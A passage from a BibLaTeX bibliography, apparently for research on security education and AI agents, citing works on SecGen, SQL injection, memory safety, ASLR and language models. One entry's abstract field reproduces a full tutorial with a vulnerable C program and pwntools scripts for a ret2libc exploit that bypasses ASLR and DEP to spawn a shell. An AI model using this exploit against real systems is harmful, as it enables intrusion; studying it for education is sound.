	url = {https://eprints.leedsbeckett.ac.uk/id/eprint/1479/},
	shorttitle = {Generating randomised virtualised scenarios for ethical hacking and computer security education},
	abstract = {Computer security students benefit from having hands-on experience with hacking tools and with access to vulnerable systems that they can attack and defend. However, vulnerable {VMs} are static; once they have been exploited by a student there is no repeatable challenge as the vulnerable boxes never change. A new novel solution, {SecGen}, has been created and deployed. {SecGen} solves the issue by creating vulnerable machines with randomised vulnerabilities and services, with constraints that ensure each scenario is catered to specific skills or concepts. {SecGen} was successfully deployed to generate {VMs} for a second year undergraduate team module. Future plans are discussed.},
	eventtitle = {The first {UK} Workshop on Cybersecurity Training \& Education (Vibrant Workshop 2015)},
	author = {Schreuders, Z. C. and Ardern, L.},
	urldate = {2025-07-11},
	date = {2015-06-11},
	langid = {english},
}

@article{schreuders_security_nodate,
	title = {Security Scenario Generator ({SecGen}): A Framework for Generating Randomly Vulnerable Rich-scenario {VMs} for Learning Computer Security and Hosting {CTF} Events},
	abstract = {Computer security students benefit from hands-on experience applying security tools and techniques to attack and defend vulnerable systems. Virtual machines ({VMs}) provide an effective way of sharing targets for hacking. However, developing these hacking challenges is time consuming, and once created, essentially static. That is, once the challenge has been "solved" there is no remaining challenge for the student, and if the challenge is created for a competition or assessment, the challenge cannot be reused without risking plagiarism, and collusion.},
	author = {Schreuders, Z Cliffe and Shaw, Thomas and Shan-A-Khuda, Mohammad and Ravichandran, Gajendra and Keighley, Jason and Ordean, Mihai},
	langid = {english},
}

@inproceedings{schreuders_hackerbot_2018,
	title = {Hackerbot: Attacker Chatbots for Randomised and Interactive Security Labs, Using \{{SecGen}\} and \{{oVirt}\}},
	url = {https://www.usenix.org/conference/ase18/presentation/schreuders},
	shorttitle = {Hackerbot},
	eventtitle = {2018 {USENIX} Workshop on Advances in Security Education ({ASE} 18)},
	author = {Schreuders, Z. Cliffe and Shaw, Thomas and Muireadhaigh, Aimée Mac and Staniforth, Paul},
	urldate = {2025-07-10},
	date = {2018},
	langid = {english},
}

@article{rhode_ai_nodate,
	title = {{AI} for Security Topic Guide Issue 1.0.0},
	author = {Rhode, Matilda},
	langid = {english},
}

@inproceedings{boyd_sqlrand_2004,
	location = {Berlin, Heidelberg},
	title = {{SQLrand}: Preventing {SQL} Injection Attacks},
	isbn = {978-3-540-24852-1},
	doi = {10.1007/978-3-540-24852-1_21},
	shorttitle = {{SQLrand}},
	abstract = {We present a practical protection mechanism against {SQL} injection attacks. Such attacks target databases that are accessible through a web front-end, and take advantage of flaws in the input validation logic of Web components such as {CGI} scripts. We apply the concept of instruction-set randomization to {SQL}, creating instances of the language that are unpredictable to the attacker. Queries injected by the attacker will be caught and terminated by the database parser. We show how to use this technique with the {MySQL} database using an intermediary proxy that translates the random {SQL} to its standard language. Our mechanism imposes negligible performance overhead to query processing and can be easily retrofitted to existing systems.},
	pages = {292--302},
	booktitle = {Applied Cryptography and Network Security},
	publisher = {Springer},
	author = {Boyd, Stephen W. and Keromytis, Angelos D.},
	editor = {Jakobsson, Markus and Yung, Moti and Zhou, Jianying},
	date = {2004},
	langid = {english},
	keywords = {Error Message, Injection Attack, Syntax Error, Template Query, {USENIX} Security Symposium},
}

@online{noauthor_what_nodate,
	title = {What is {SQL} Injection? Tutorial \& Examples {\textbar} Web Security Academy},
	url = {https://portswigger.net/web-security/sql-injection},
	shorttitle = {What is {SQL} Injection?},
	abstract = {In this section, we explain: What {SQL} injection ({SQLi}) is. How to find and exploit different types of {SQLi} vulnerabilities. How to prevent {SQLi}. Labs If ...},
	urldate = {2025-07-02},
}

@online{china_what_2025,
	title = {What Is {API} Security? {\textbar} {IBM}},
	url = {https://www.ibm.com/think/topics/api-security},
	shorttitle = {What Is {API} Security?},
	abstract = {{API} security is a set of practices and procedures that protect application programming interfaces ({APIs}) and the data they transmit from misuse, malicious bot attacks and other cybersecurity threats.},
	author = {China, Chrystal and Goodwin, Michael},
	urldate = {2025-07-02},
	date = {2025-05-15},
	langid = {english},
}

@online{rina_diane_caballar_move_2023,
	title = {The Move to Memory-Safe Programming - {IEEE} Spectrum},
	url = {https://spectrum.ieee.org/memory-safe-programming-languages},
	abstract = {Shifting from C and C++ to memory-safe programming languages like Rust is gaining ground},
	author = {{Rina Diane Caballar}},
	urldate = {2025-06-30},
	date = {2023-03-20},
	langid = {english},
}

@online{michiel_lemmens_stack_2021,
	title = {Stack Canaries – Gingerly Sidestepping the Cage {\textbar} {SANS} Institute},
	url = {https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/},
	author = {{Michiel Lemmens}},
	urldate = {2025-06-30},
	date = {2021-02-04},
}

@article{beaman_fuzzing_2022,
	title = {Fuzzing vulnerability discovery techniques: Survey, challenges and future directions},
	volume = {120},
	issn = {01674048},
	url = {https://linkinghub.elsevier.com/retrieve/pii/S0167404822002073},
	doi = {10.1016/j.cose.2022.102813},
	shorttitle = {Fuzzing vulnerability discovery techniques},
	abstract = {Fuzzing is a powerful tool for vulnerability discovery in software, with much progress being made in the ﬁeld in recent years. There is limited literature available on the fuzzing vulnerability discovery approaches. Hence, in this paper, an attempt has been made to explore the recent advances in the area of fuzzing vulnerability discovery and to propose a reﬁnement to the classiﬁcation of fuzzers. Furthermore, we have identiﬁed key research challenges and potential future areas of research that might provide new insight to researchers.},
	pages = {102813},
	journaltitle = {Computers \& Security},
	shortjournal = {Computers \& Security},
	author = {Beaman, Craig and Redbourne, Michael and Mummery, J. Darren and Hakak, Saqib},
	urldate = {2025-06-30},
	date = {2022-09},
	langid = {english},
}

@online{noauthor_fact_2024,
	title = {Fact Sheet: {ONCD} Report Calls for Adoption of Memory Safe Programming Languages and Addressing the Hard Research Problem of Software Measurability {\textbar} {ONCD}},
	url = {https://bidenwhitehouse.archives.gov/oncd/briefing-room/2024/02/26/memory-safety-fact-sheet/},
	shorttitle = {Fact Sheet},
	abstract = {{ONCD} Rallies Industry, Academia, and Civil Society to Join Effort February 26, 2024 Read the full report here Watch the video address here Today, the Office of the National Cyber Director ({ONCD}) published a technical report entitled “Back to the Building Blocks: A Path Toward Secure and Measurable Software.” The report builds upon the President’s…},
	titleaddon = {The White House},
	urldate = {2025-06-29},
	date = {2024-02-26},
	langid = {american},
}

@online{gallucci_aslr_2024,
	title = {{ASLR}, bypass techniques, and circumvention impacts},
	url = {https://oliviagallucci.com/aslr-bypass-techniques-and-circumvention-impacts/},
	abstract = {Address space layout randomization ({ASLR}) randomizes memory addresses used by system and application processes.},
	titleaddon = {Olivia A. Gallucci},
	author = {Gallucci, Olivia A.},
	urldate = {2025-06-29},
	date = {2024-10-28},
	langid = {american},
}

@online{sporici_bypassing_2019,
	title = {Bypassing {ASLR} and {DEP} - Getting Shells with pwntools},
	url = {https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools},
	abstract = {Today, I’d like to take some time and to present a short trick to bypass both {ASLR} (Address Space Layout Randomization) and {DEP} (Data Execution Prevention) in order to obtain a shell in a buffer-overflow vulnerable binary. I’ve seen this problem discussed using return-to-{PLT} strategies, which is fine if your targeted method is already used in the binary – although, let’s face it, not many programs will call system() or exec() and invite you to spawn shells. This approach revolves around a return-to-libc attack in which the attacker first leaks the address of a known function (e.g.: puts()) and then computes the offset between that known function and the targeted function (e.g.: system()). By summing the 2 values, the result is the address of the function that we want to call using the exploit. If you understood this part, you only need to prepare the payloads. Given a vulnerable binary, let’s consider the following scenario: {ASLR} is enabled {DEP} is enabled Only gets() and puts() are called in the binary Running on a x64 system (no brute-force) For the sake of simplicity: no stack protectors (no canary values) The attacker knows which libc version is used by the binary Vulnerable Binary While writing this, I’ve been using this really simple binary (vuln.c): 1 2 3 4 5 6 7 8 9 10 11 \#include{\textless}stdio.h{\textgreater} int main() \{ char buffer[40]; gets(buffer); printf("hi there{\textbackslash}n"); return 0; \} Compiled with the following parameters: 1 gcc -Wall -ansi -fno-stack-protector vuln.c -o vuln Step 1: Basic Buffer Overflow We start by finding the offset in order to overwrite the return address and perform a simple execution hijacking. There are multiple ways of doing this: you can either start with a payload of a random size and analyze the behavior of the binary in a debugger (like {GDB}) such as the image below, where we overwrite the return address and the {RIP} ({PC}) jumps to 0x414241424142 (“{ABABAB}”) Finding the offset for a buffer overflow attack by trial-and-error I usually test this with an address that calls a specific function or jumps back to the start of the program (0x400566) The ‘main’ address is used to call the program multiple times and supply multiple payloads Should you succeed, it will print twice the same message: Running the same program twice to prevent {ASLR} re-randomization Why is this important? It is important because {ASLR} randomizes the heap, stack and the offsets where are mapped the libraries (such as libc) only when the binary is launched into execution. Calling main once again will not trigger a re-randomization. This means we can submit multiple payloads while having fixed offsets (mitigating the effect of {ASLR}). Step 2: Leaking the Address of puts@libc This is the difficult part. Multiple payloads are required in order to spawn a shell using this binary. Basically, you’ll want to leak the address of puts() using a puts@{PLT}() call and then compute the address of system() by having access to libc. Additionally, you’ll want to compute the address of a “sh” string, in order to achieve a system("sh") call. You’ll have to use a second payload to perform the aforementioned call. I recommend you perform these steps using a framework like pwntools since the the second payload must be adapted using information leaked at runtime. To continue, one must understand the role of the {GOT} (Global Offset Table) in a binary as there is no exact way of previously knowing where {ASLR} will map each external library of the current process. Running ldd reveals different mapping addresses of libc each time the process starts The addresses of the external methods are usually determined at runtime when these methods are called for the first time (i.e.: when the {PLT} trampoline is executed for the first time). However, the addresses need to be referenced in the original code before the program runs -{\textgreater} so placeholders (fixed addresses / @{GOT} addresses) are used. {GOT} acts as a dictionary and binds the placeholder addresses to the real/external addresses (in the library). The values of the {GOT} are determined and written by the dynamic address solver (linker) once a method is called. In our first payload, we’ll want to use {GOT} addresses (placeholders) instead of external addresses (which are randomized). One interesting observation is that calling puts(puts@{GOT}) will actually output the external address of puts@libc. We’ll want our initial payload to perform such a call in order to have an initial idea of where the libc is mapped. Start by running the following command so you can view the address of puts@{GOT}: 1 objdump -R vuln Pay attention at the second row and write down the address: 1 2 3 4 5 6 {OFFSET} {TYPE} {VALUE} 0000000000600ff8 R\_X86\_64\_GLOB\_DAT \_\_gmon\_start\_\_ {\textgreater} 0000000000601018 R\_X86\_64\_JUMP\_SLOT puts@{GLIBC}\_2.2.5 0000000000601020 R\_X86\_64\_JUMP\_SLOT \_\_libc\_start\_main@{GLIBC}\_2.2.5 0000000000601028 R\_X86\_64\_JUMP\_SLOT gets@{GLIBC}\_2.2.5 Next, you’ll need a {ROP} gadget that takes a parameter from the stack and places it into the {RDI} register (in our case, takes the @{GOT} address from our payload, from the stack, and sets it as the first parameter for a future puts@{PLT} call). As you remember, we’re running on a x64 architecture and the calling convention states that the first parameter of a method must be placed in the {RDI} register. We’re looking for a {POP} {RDI}; {RET} gadget – I’m doing this using {ROPgadget} (so it’s {ROPgadget} --binary vuln) but feel free to use whatever you’re comfortable with ({GDB}, radare2, etc.). We’ll get the following line: 0x00000000004005f3 : pop rdi ; ret The last thing that the payload requires is a way to call puts(). We can achieve this by calling puts@{PLT} (through the {PLT} trampoline) since its address is also fixed and unaffected by {ASLR}. You can use something like this to extract the address from the binary: 1 objdump -d -M intel vuln {\textbar} grep "puts@plt" I got something like this: 0000000000400430 {\textless}puts@plt{\textgreater}: Finally, we can construct the first payload. I’ll write this as a pwntools python script so I’ll be able to expand it and include the second payload. The new flow of the program must be the following: {RET} to pop\_rdi\_ret\_address -{\textgreater} ({RDI} = puts@{GOT}) {RET} to puts\_plt\_address -{\textgreater} {RET} to main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * r = process('vuln') main\_address = 0x00400566 puts\_got\_address = 0x0000000000601018 puts\_plt\_address = 0x0000000000400430 pop\_rdi\_ret\_address = 0x00000000004005f3 payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(puts\_got\_address) + p64(puts\_plt\_address) + p64(main\_address) r.sendline(payload) print r.recvline() \# "hi there" leaked\_output = r.recvline() leaked\_output = leaked\_output[:-1] print('leaked puts() address', leaked\_output) r.sendline('a') print r.recvline() \# "hi there" And when running it… Leaking the address of puts@libc Step 3: Finding the Address of system@libc In this part, we compute the offset between puts@libc and system@libc while also finding the address of a “sh” string. We know, from the previous ldd run, that the binary uses the libc located at: /lib/x86\_64-linux-gnu/libc.so.6. Running the following commands will return the offsets of system() and puts() from libc: 1 2 objdump -d -M intel /lib/x86\_64-linux-gnu/libc.so.6 {\textbar} grep "system" objdump -d -M intel /lib/x86\_64-linux-gnu/libc.so.6 {\textbar} grep "\_IO\_puts" The lines of interest are: 1 2 0000000000045390 {\textless}\_\_libc\_system@@{GLIBC}\_PRIVATE{\textgreater}: 000000000006f690 {\textless}\_IO\_puts@@{GLIBC}\_2.2.5{\textgreater}: I found the offset of the “sh” string inside libc using radare2. Pick one. Offsets of various ‘sh’ strings inside libc (radare2) Subtracting puts()’s offset from the leaked puts@libc address gives us the base address of libc (the start of the memory region where it is mapped for the current process). By adding the offset of system() we get a call to system@libc. Now, we can adapt the previous script in order to create the second payload that makes the call. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * r = process('vuln') main\_address = 0x00400566 puts\_got\_address = 0x0000000000601018 puts\_plt\_address = 0x0000000000400430 pop\_rdi\_ret\_address = 0x00000000004005f3 puts\_libc\_offset = 0x000000000006f690 system\_libc\_offset = 0x0000000000045390 sh\_libc\_offset = 0x00011e70 payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(puts\_got\_address) + p64(puts\_plt\_address) + p64(main\_address) r.sendline(payload) print r.recvline() leaked\_output = r.recvline() leaked\_output = leaked\_output[:-1] print('leaked puts() address', leaked\_output) leaked\_output += '{\textbackslash}x00{\textbackslash}x00' puts\_libc\_address = u64(leaked\_output) system\_libc\_address = puts\_libc\_address - puts\_libc\_offset + system\_libc\_offset print('system() address', p64(system\_libc\_address)) sh\_libc\_address = puts\_libc\_address - puts\_libc\_offset + sh\_libc\_offset payload = 'A'*56 + p64(pop\_rdi\_ret\_address) + p64(sh\_libc\_address) + p64(system\_libc\_address) + p64(main\_address) r.sendline(payload) print(r.recvline()) \# hi there \#r.sendline(payload) r.interactive() Small Proof-Of-Concept Here is a small {PoC}, representing the final result. For reference, the {VM} runs 64 bit image of Ubuntu 16.04 Xenial with glibc 2.23 (md5(libc.so.6): 8c0d248ea33e6ef17b759fa5d81dda9e), pwntools 4.0.1 and Python 2.7. Upon receiving an email (thanks Stefan), I’ve noticed that I was sending the payload twice (had 2x r.sendline(payload)); this caused the weird “not found” message in the shell. I commented it out in the code above but left the image in case someone has this issue too. Proof-Of-Concept: Shell spawned inside a Process with {ASLR} and {DEP} {CodeProject}},
	titleaddon = {coding.vision},
	author = {Sporici, Dan},
	urldate = {2025-06-29},
	date = {2019-07-02},
}

@online{syedishrarali_aslr_2024,
	title = {{ASLR}: Address Space Layout Randomization},
	url = {https://medium.com/@syedishrarali/aslr-address-space-layout-randomization-eb94203a0e7d},
	shorttitle = {{ASLR}},
	abstract = {From Basics to Advanced: Understanding and Navigating {ASLR} Implementation in {PE} Files},
	titleaddon = {Medium},
	author = {Syedishrarali},
	urldate = {2025-06-29},
	date = {2024-11-28},
	langid = {english},
}

@misc{aleph_one_smashing_1996,
	title = {Smashing The Stack For Fun And Profit},
	url = {https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf},
	publisher = {Phrack},
	author = {{Aleph One}},
	date = {1996},
}

@misc{chen_parallel_2025,
	title = {Parallel Scaling Law for Language Models},
	url = {http://arxiv.org/abs/2505.10475},
	doi = {10.48550/arXiv.2505.10475},
	abstract = {It is commonly believed that scaling language models should commit a significant space or time cost, by increasing the parameters (parameter scaling) or output tokens (inference-time scaling). We introduce the third and more inference-efficient scaling paradigm: increasing the model's parallel computation during both training and inference time. We apply \$P\$ diverse and learnable transformations to the input, execute forward passes of the model in parallel, and dynamically aggregate the \$P\$ outputs. This method, namely parallel scaling ({ParScale}), scales parallel computation by reusing existing parameters and can be applied to any model structure, optimization procedure, data, or task. We theoretically propose a new scaling law and validate it through large-scale pre-training, which shows that a model with \$P\$ parallel streams is similar to scaling the parameters by \$O({\textbackslash}log P)\$ while showing superior inference efficiency. For example, {ParScale} can use up to 22\${\textbackslash}times\$ less memory increase and 6\${\textbackslash}times\$ less latency increase compared to parameter scaling that achieves the same performance improvement. It can also recycle an off-the-shelf pre-trained model into a parallelly scaled one by post-training on a small amount of tokens, further reducing the training budget. The new scaling law we discovered potentially facilitates the deployment of more powerful models in low-resource scenarios, and provides an alternative perspective for the role of computation in machine learning.},
	number = {{arXiv}:2505.10475},
	publisher = {{arXiv}},
	author = {Chen, Mouxiang and Hui, Binyuan and Cui, Zeyu and Yang, Jiaxi and Liu, Dayiheng and Sun, Jianling and Lin, Junyang and Liu, Zhongxin},
	urldate = {2025-06-19},
	date = {2025-05-15},
	eprinttype = {arxiv},
	eprint = {2505.10475 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@online{merritt_what_2025,
	title = {What Is Retrieval-Augmented Generation aka {RAG}?},
	url = {https://blogs.nvidia.com/blog/what-is-retrieval-augmented-generation/},
	abstract = {Retrieval-augmented generation ({RAG}) is a technique for enhancing the accuracy and reliability of generative {AI} models with facts fetched from external sources.},
	titleaddon = {{NVIDIA} Blog},
	author = {Merritt, Rick},
	urldate = {2025-06-19},
	date = {2025-01-31},
	langid = {american},
}

@online{noauthor_what_2025,
	title = {What Is Agentic {AI}? {\textbar} {IBM}},
	url = {https://www.ibm.com/think/topics/agentic-ai},
	shorttitle = {What Is Agentic {AI}?},
	abstract = {Agentic {AI} is an artificial intelligence system that can accomplish a specific goal with limited supervision. It consists of ai agents—machine learning models that mimic human decision-making to solve problems in real time.},
	urldate = {2025-06-18},
	date = {2025-02-24},
	langid = {english},
}

@online{pounds_what_2024,
	title = {What Is Agentic {AI}?},
	url = {https://blogs.nvidia.com/blog/what-is-agentic-ai/},
	abstract = {Agentic {AI} connects to enterprise data and uses sophisticated reasoning and iterative planning to  autonomously solve complex, multi-step problems.},
	titleaddon = {{NVIDIA} Blog},
	author = {Pounds, Erik},
	urldate = {2025-06-17},
	date = {2024-10-22},
	langid = {american},
}

@online{team_qwq_2024,
	title = {{QwQ}: Reflect Deeply on the Boundaries of the Unknown},
	url = {https://qwenlm.github.io/blog/qwq-32b-preview/},
	shorttitle = {{QwQ}},
	abstract = {{GITHUB} {HUGGING} {FACE} {MODELSCOPE} {DEMO} {DISCORD}
Note: This is the pronunciation of {QwQ}: /kwju:/ , similar to the word “quill”.
What does it mean to think, to question, to understand? These are the deep waters that {QwQ} (Qwen with Questions) wades into. Like an eternal student of wisdom, it approaches every problem - be it mathematics, code, or knowledge of our world - with genuine wonder and doubt. {QwQ} embodies that ancient philosophical spirit: it knows that it knows nothing, and that’s precisely what drives its curiosity.},
	titleaddon = {Qwen},
	author = {Team, Qwen},
	urldate = {2025-04-02},
	date = {2024-11-28},
	langid = {english},
	note = {Section: blog},
}

@misc{team_gemma_2024,
	title = {Gemma: Open Models Based on Gemini Research and Technology},
	url = {http://arxiv.org/abs/2403.08295},
	doi = {10.48550/arXiv.2403.08295},
	shorttitle = {Gemma},
	abstract = {This work introduces Gemma, a family of lightweight, state-of-the art open models built from the research and technology used to create Gemini models. Gemma models demonstrate strong performance across academic benchmarks for language understanding, reasoning, and safety. We release two sizes of models (2 billion and 7 billion parameters), and provide both pretrained and fine-tuned checkpoints. Gemma outperforms similarly sized open models on 11 out of 18 text-based tasks, and we present comprehensive evaluations of safety and responsibility aspects of the models, alongside a detailed description of model development. We believe the responsible release of {LLMs} is critical for improving the safety of frontier models, and for enabling the next wave of {LLM} innovations.},
	number = {{arXiv}:2403.08295},
	publisher = {{arXiv}},
	author = {Team, Gemma and Mesnard, Thomas and Hardin, Cassidy and Dadashi, Robert and Bhupatiraju, Surya and Pathak, Shreya and Sifre, Laurent and Rivière, Morgane and Kale, Mihir Sanjay and Love, Juliette and Tafti, Pouya and Hussenot, Léonard and Sessa, Pier Giuseppe and Chowdhery, Aakanksha and Roberts, Adam and Barua, Aditya and Botev, Alex and Castro-Ros, Alex and Slone, Ambrose and Héliou, Amélie and Tacchetti, Andrea and Bulanova, Anna and Paterson, Antonia and Tsai, Beth and Shahriari, Bobak and Lan, Charline Le and Choquette-Choo, Christopher A. and Crepy, Clément and Cer, Daniel and Ippolito, Daphne and Reid, David and Buchatskaya, Elena and Ni, Eric and Noland, Eric and Yan, Geng and Tucker, George and Muraru, George-Christian and Rozhdestvenskiy, Grigory and Michalewski, Henryk and Tenney, Ian and Grishchenko, Ivan and Austin, Jacob and Keeling, James and Labanowski, Jane and Lespiau, Jean-Baptiste and Stanway, Jeff and Brennan, Jenny and Chen, Jeremy and Ferret, Johan and Chiu, Justin and Mao-Jones, Justin and Lee, Katherine and Yu, Kathy and Millican, Katie and Sjoesund, Lars Lowe and Lee, Lisa and Dixon, Lucas and Reid, Machel and Mikuła, Maciej and Wirth, Mateo and Sharman, Michael and Chinaev, Nikolai and Thain, Nithum and Bachem, Olivier and Chang, Oscar and Wahltinez, Oscar and Bailey, Paige and Michel, Paul and Yotov, Petko and Chaabouni, Rahma and Comanescu, Ramona and Jana, Reena and Anil, Rohan and {McIlroy}, Ross and Liu, Ruibo and Mullins, Ryan and Smith, Samuel L. and Borgeaud, Sebastian and Girgin, Sertan and Douglas, Sholto and Pandya, Shree and Shakeri, Siamak and De, Soham and Klimenko, Ted and Hennigan, Tom and Feinberg, Vlad and Stokowiec, Wojciech and Chen, Yu-hui and Ahmed, Zafarali and Gong, Zhitao and Warkentin, Tris and Peran, Ludovic and Giang, Minh and Farabet, Clément and Vinyals, Oriol and Dean, Jeff and Kavukcuoglu, Koray and Hassabis, Demis and Ghahramani, Zoubin and Eck, Douglas and Barral, Joelle and Pereira, Fernando and Collins, Eli and Joulin, Armand and Fiedel, Noah and Senter, Evan and Andreev, Alek and Kenealy, Kathleen},
	urldate = {2025-04-02},
	date = {2024-04-16},
	eprinttype = {arxiv},
	eprint = {2403.08295 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{deepseek-ai_deepseek-r1_2025,
	title = {{DeepSeek}-R1: Incentivizing Reasoning Capability in {LLMs} via Reinforcement Learning},
	url = {http://arxiv.org/abs/2501.12948},
	doi = {10.48550/arXiv.2501.12948},
	shorttitle = {{DeepSeek}-R1},
	abstract = {We introduce our first-generation reasoning models, {DeepSeek}-R1-Zero and {DeepSeek}-R1. {DeepSeek}-R1-Zero, a model trained via large-scale reinforcement learning ({RL}) without supervised fine-tuning ({SFT}) as a preliminary step, demonstrates remarkable reasoning capabilities. Through {RL}, {DeepSeek}-R1-Zero naturally emerges with numerous powerful and intriguing reasoning behaviors. However, it encounters challenges such as poor readability, and language mixing. To address these issues and further enhance reasoning performance, we introduce {DeepSeek}-R1, which incorporates multi-stage training and cold-start data before {RL}. {DeepSeek}-R1 achieves performance comparable to {OpenAI}-o1-1217 on reasoning tasks. To support the research community, we open-source {DeepSeek}-R1-Zero, {DeepSeek}-R1, and six dense models (1.5B, 7B, 8B, 14B, 32B, 70B) distilled from {DeepSeek}-R1 based on Qwen and Llama.},
	number = {{arXiv}:2501.12948},
	publisher = {{arXiv}},
	author = {{DeepSeek}-{AI} and Guo, Daya and Yang, Dejian and Zhang, Haowei and Song, Junxiao and Zhang, Ruoyu and Xu, Runxin and Zhu, Qihao and Ma, Shirong and Wang, Peiyi and Bi, Xiao and Zhang, Xiaokang and Yu, Xingkai and Wu, Yu and Wu, Z. F. and Gou, Zhibin and Shao, Zhihong and Li, Zhuoshu and Gao, Ziyi and Liu, Aixin and Xue, Bing and Wang, Bingxuan and Wu, Bochao and Feng, Bei and Lu, Chengda and Zhao, Chenggang and Deng, Chengqi and Zhang, Chenyu and Ruan, Chong and Dai, Damai and Chen, Deli and Ji, Dongjie and Li, Erhang and Lin, Fangyun and Dai, Fucong and Luo, Fuli and Hao, Guangbo and Chen, Guanting and Li, Guowei and Zhang, H. and Bao, Han and Xu, Hanwei and Wang, Haocheng and Ding, Honghui and Xin, Huajian and Gao, Huazuo and Qu, Hui and Li, Hui and Guo, Jianzhong and Li, Jiashi and Wang, Jiawei and Chen, Jingchang and Yuan, Jingyang and Qiu, Junjie and Li, Junlong and Cai, J. L. and Ni, Jiaqi and Liang, Jian and Chen, Jin and Dong, Kai and Hu, Kai and Gao, Kaige and Guan, Kang and Huang, Kexin and Yu, Kuai and Wang, Lean and Zhang, Lecong and Zhao, Liang and Wang, Litong and Zhang, Liyue and Xu, Lei and Xia, Leyi and Zhang, Mingchuan and Zhang, Minghua and Tang, Minghui and Li, Meng and Wang, Miaojun and Li, Mingming and Tian, Ning and Huang, Panpan and Zhang, Peng and Wang, Qiancheng and Chen, Qinyu and Du, Qiushi and Ge, Ruiqi and Zhang, Ruisong and Pan, Ruizhe and Wang, Runji and Chen, R. J. and Jin, R. L. and Chen, Ruyi and Lu, Shanghao and Zhou, Shangyan and Chen, Shanhuang and Ye, Shengfeng and Wang, Shiyu and Yu, Shuiping and Zhou, Shunfeng and Pan, Shuting and Li, S. S. and Zhou, Shuang and Wu, Shaoqing and Ye, Shengfeng and Yun, Tao and Pei, Tian and Sun, Tianyu and Wang, T. and Zeng, Wangding and Zhao, Wanjia and Liu, Wen and Liang, Wenfeng and Gao, Wenjun and Yu, Wenqin and Zhang, Wentao and Xiao, W. L. and An, Wei and Liu, Xiaodong and Wang, Xiaohan and Chen, Xiaokang and Nie, Xiaotao and Cheng, Xin and Liu, Xin and Xie, Xin and Liu, Xingchao and Yang, Xinyu and Li, Xinyuan and Su, Xuecheng and Lin, Xuheng and Li, X. Q. and Jin, Xiangyue and Shen, Xiaojin and Chen, Xiaosha and Sun, Xiaowen and Wang, Xiaoxiang and Song, Xinnan and Zhou, Xinyi and Wang, Xianzu and Shan, Xinxia and Li, Y. K. and Wang, Y. Q. and Wei, Y. X. and Zhang, Yang and Xu, Yanhong and Li, Yao and Zhao, Yao and Sun, Yaofeng and Wang, Yaohui and Yu, Yi and Zhang, Yichao and Shi, Yifan and Xiong, Yiliang and He, Ying and Piao, Yishi and Wang, Yisong and Tan, Yixuan and Ma, Yiyang and Liu, Yiyuan and Guo, Yongqiang and Ou, Yuan and Wang, Yuduan and Gong, Yue and Zou, Yuheng and He, Yujia and Xiong, Yunfan and Luo, Yuxiang and You, Yuxiang and Liu, Yuxuan and Zhou, Yuyang and Zhu, Y. X. and Xu, Yanhong and Huang, Yanping and Li, Yaohui and Zheng, Yi and Zhu, Yuchen and Ma, Yunxian and Tang, Ying and Zha, Yukun and Yan, Yuting and Ren, Z. Z. and Ren, Zehui and Sha, Zhangli and Fu, Zhe and Xu, Zhean and Xie, Zhenda and Zhang, Zhengyan and Hao, Zhewen and Ma, Zhicheng and Yan, Zhigang and Wu, Zhiyu and Gu, Zihui and Zhu, Zijia and Liu, Zijun and Li, Zilin and Xie, Ziwei and Song, Ziyang and Pan, Zizheng and Huang, Zhen and Xu, Zhipeng and Zhang, Zhongyu and Zhang, Zhen},
	urldate = {2025-04-02},
	date = {2025-01-22},
	eprinttype = {arxiv},
	eprint = {2501.12948 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{fang_teams_2024,
	title = {Teams of {LLM} Agents can Exploit Zero-Day Vulnerabilities},
	url = {http://arxiv.org/abs/2406.01637},
	doi = {10.48550/arXiv.2406.01637},
	abstract = {{LLM} agents have become increasingly sophisticated, especially in the realm of cybersecurity. Researchers have shown that {LLM} agents can exploit real-world vulnerabilities when given a description of the vulnerability and toy capture-the-flag problems. However, these agents still perform poorly on real-world vulnerabilities that are unknown to the agent ahead of time (zero-day vulnerabilities). In this work, we show that teams of {LLM} agents can exploit real-world, zero-day vulnerabilities. Prior agents struggle with exploring many different vulnerabilities and long-range planning when used alone. To resolve this, we introduce {HPTSA}, a system of agents with a planning agent that can launch subagents. The planning agent explores the system and determines which subagents to call, resolving long-term planning issues when trying different vulnerabilities. We construct a benchmark of 15 real-world vulnerabilities and show that our team of agents improve over prior work by up to 4.5\${\textbackslash}times\$.},
	number = {{arXiv}:2406.01637},
	publisher = {{arXiv}},
	author = {Fang, Richard and Bindu, Rohan and Gupta, Akul and Zhan, Qiusi and Kang, Daniel},
	urldate = {2025-03-12},
	date = {2024-06-02},
	eprinttype = {arxiv},
	eprint = {2406.01637 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Multiagent Systems},
}

@online{hartford_uncensored_2023,
	title = {Uncensored Models},
	url = {https://erichartford.com/uncensored-models},
	abstract = {I am publishing this because many people are asking me how I did it, so I will explain.
https://huggingface.co/ehartford/{WizardLM}-30B-Uncensored
https://huggingface.co/ehartford/{WizardLM}-13B-Uncensored
https://huggingface.co/ehartford/{WizardLM}-7B-Unc...},
	titleaddon = {Cognitive Computations},
	author = {Hartford, Eric},
	urldate = {2025-03-04},
	date = {2023-05-15},
	langid = {english},
}

@article{noauthor_pdf_2024,
	title = {({PDF}) {CyExec}*: A High-Performance Container-Based Cyber Range With Scenario Randomization},
	url = {https://www.researchgate.net/publication/353789873_CyExec_A_High-Performance_Container-Based_Cyber_Range_With_Scenario_Randomization},
	doi = {10.1109/ACCESS.2021.3101245},
	shorttitle = {({PDF}) {CyExec}*},
	abstract = {{PDF} {\textbar} With increasing threats to information security, information security education through practical exercises specifically cyber range has attracted... {\textbar} Find, read and cite all the research you need on {ResearchGate}},
	journaltitle = {{ResearchGate}},
	urldate = {2024-12-07},
	date = {2024-10-22},
	langid = {english},
}

@article{chouliaras_novel_2023,
	title = {A novel autonomous container-based platform for cybersecurity training and research},
	volume = {9},
	issn = {2376-5992},
